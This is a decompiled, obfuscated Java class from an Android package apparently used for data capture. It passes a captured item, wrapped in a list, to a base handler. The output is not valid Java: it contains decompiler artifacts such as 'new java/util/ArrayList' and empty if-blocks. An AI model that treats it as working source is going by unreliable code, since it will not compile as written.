package com.vvt.capture.f;

import android.content.Context;
import java.util.ArrayList;
import java.util.List;

class d
  implements a
{
  d(c paramc) {}
  
  public void a()
  {
    boolean bool = c.c();
    if (bool) {}
    Object localObject1 = c.b(this.a);
    Object localObject2 = c.a(this.a);
    localObject1 = ((com.vvt.capture.f.b.a)localObject1).a((Context)localObject2);
    localObject2 = c.c(this.a);
    if ((localObject2 != null) && (localObject1 != null))
    {
      localObject2 = new java/util/ArrayList;
      ((ArrayList)localObject2).<init>();
      c localc = this.a;
      localObject1 = c.a(localc, (b)localObject1);
      ((List)localObject2).add(localObject1);
      localObject1 = c.c(this.a);
      ((com.vvt.base.a)localObject1).a((List)localObject2);
    }
    bool = c.c();
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/f/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */